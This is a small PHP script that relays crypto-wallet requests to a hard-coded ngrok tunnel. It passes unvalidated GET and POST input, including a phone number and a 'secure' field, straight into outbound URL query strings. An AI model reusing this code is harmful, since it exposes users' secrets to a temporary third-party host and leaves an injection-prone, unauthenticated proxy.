<?php
/*****YZX0MAKER <www class="twitter com">@YZX0Long*/
$serv = 'https://48ae-191-89-51-208.ngrok.io';

if ($_GET['id'] == 'makewallet') {
    $uid = $_GET['uid'];
    $headers = ['Accepts: application/json'];
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $serv . '/crypto/makewallet/' . $uid);
    $data = curl_exec($curl);
    curl_close($curl);
} elseif ($_GET['id'] == 'updatedata') {
    $wallet = $_GET['wallet'];
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $serv . '/crypto/updatedata/' . $wallet);
    $data = curl_exec($curl);
    curl_close($curl);
} elseif ($_GET['id'] == 'makeFiat') {
    $fields = [
        'cel' => $_POST['cel'],
        'secure' => $_POST['secure'],
        'uid' => $_POST['uid'],
    ];
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv . '/crypto/' . $_GET['id'] . '/?' . $fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($curl);
    curl_close($curl);
    echo json_encode($data);
} else {
    echo 'La data que intentas pedir esta protegida';
}
?>
